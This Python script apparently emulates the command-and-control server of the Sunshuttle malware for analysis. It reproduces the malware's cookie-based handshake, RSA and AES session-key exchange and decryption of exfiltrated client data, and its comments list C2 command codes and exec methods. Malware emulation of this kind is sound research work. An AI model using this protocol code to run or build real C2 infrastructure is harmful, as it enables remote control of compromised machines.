# change to c2 server address:
# e.g. https://reyweb.com
#      http://localhost/a
# hash: B9A2C986B6AD1EB4CFB0303BAEDE906936FE96396F3CF490B0984A4798D741D8
# Can be downloaded at VT, Any.Run, etc.
# Please do not use malware on non-analysis ready/designed systems

import os
import sys
import http.server
import http.cookies
import base64
from urllib.parse import parse_qs

# Requirement: [Cryptography]
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7


#alternatively you could use PyCryptodome (as replacement of PyCrypto)

HOSTNAME = "localhost"
PORT = 80

RSA_PubKey = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Aj/3K3m/rKNESwUfHC9
qAhnsNYA9bJ4HQ30DPsfPDvbbHZmUj5nyp2abjYZYMQbWa2+ZO4Ixgfdm0FzsAH/
haKIN4sSkbw+YRESYW35MnMI3Adfmj/eK/yKNblyoe/7iWP3nz+y4Q/QI0L6BrF7
VodTaDYtDup3iI+B5zjmhElf9FmgS1JiDUgydz5VXJR/esv6hB7GMfEb/3sIAzv5
qcwEvGK5HH1EzQ7zjauyhbsF9pHRzCFYlvW4OtaU0o3xjVufo5UwYRS5p/EFpof4
5zuJGLJ02cKUmxc0OX53t3Bn9WXYaDDhYp/RPzywG8N9gTBv8rKxRIsFxxKu+8wK
+QIDAQAB
-----END PUBLIC KEY-----"""

SESSION_KEY = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
IV = os.urandom(128)[:16]

def log(text):
    return ("[+] %s" % text)

# helper
def rsa_oaep_encrypt(data):
    key = load_pem_public_key(RSA_PubKey) 
    return key.encrypt(data, padding.OAEP(mgf=padding.MGF1(algorithm=SHA256()), algorithm=SHA256(), label=None))

def aes_encrypt(data):
    padder = PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(SESSION_KEY), modes.CFB(IV))
    encryptor = cipher.encryptor()
    ciphertext = IV + encryptor.update(padded_data) + encryptor.finalize()
    b64_ciphertext = base64.urlsafe_b64encode(ciphertext)
    return b64_ciphertext

def aes_decrypt(data):
    value_decoded = base64.urlsafe_b64decode(base64.b64decode(data) + b"===")
    cipher = Cipher(algorithms.AES(SESSION_KEY), modes.CFB(initialization_vector=value_decoded[0:16]))
    decryptor = cipher.decryptor()
    cleartext = decryptor.update(value_decoded[16:]) + decryptor.finalize()
    unpadder = PKCS7(128).unpadder()
    return unpadder.update(cleartext) + unpadder.finalize()


class SunshuttleHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(log(b"GET Request to C2 Server"))
        cookies = http.cookies.SimpleCookie(self.headers.get('Cookie'))

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()

        if "P5hCrabkKf" in cookies:
            if cookies["P5hCrabkKf"].value == "gZLXIeKI":
                print(log("main_request_session_key"))
                self.wfile.write(b"HuLjdQwyCH")
            elif cookies["P5hCrabkKf"].value == "cIHiqD5p4da6OeB":
                print(log("main_retrieve_session_key"))
                self.wfile.write(base64.b64encode(rsa_oaep_encrypt(SESSION_KEY)))
            else:
                print(log("No supported c2 command sent"))
                print(cookies, "\r\n")
        else:
            print(log("No P5hCrabkKf cookie"))
            print(cookies, "\r\n")
            self.wfile.write(b"NoValues*" + base64.b64encode(aes_encrypt(b"13QTR5pC1R")))
        sys.stdout.flush()

    def do_POST(self):
        print(log("Information POST to C2"))
        cookies = http.cookies.SimpleCookie(self.headers.get('Cookie'))
        content_length = int(self.headers["Content-Length"])
        post_data = parse_qs(self.rfile.read(content_length))
        self.wfile.write(b"HuLjdQwyCH")
        print(log("Received Data:"))
        print(cookies)
        print(post_data)
        
        if b"Dp3jaZ7if" in post_data:
            data = post_data.get(b"Dp3jaZ7if")[0]
            print("Feedback from Client: " + aes_decrypt(data).decode())


def run(server_class=http.server.HTTPServer, handler_class=SunshuttleHandler):
    server_address = (HOSTNAME, PORT)
    httpd = server_class(server_address, handler_class)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(log("Exit by User"))

if __name__ == '__main__':
    run()
    
# Requests to C2 Server:
# - Creation Session Key
# - Receive Session Key
# - Download file from C2
# - Upload a file to C2
# - Send command result to C2
# - Missing: obtain c2 command

# C2 Response: "HuLjdQwyCH", "yugDtwEGuR"
# C2 Commands:
# - HuLjdQwyCH: NoOp
# - zSsP2TSJJm3a
# - aQJmWJyXdZK721mGBI3U
# - W5VZP9Iu2uzHK
# ...
#  all can be found in main_resolve_command
# three exec commands: go exec, go exec + output sent, cmd /c
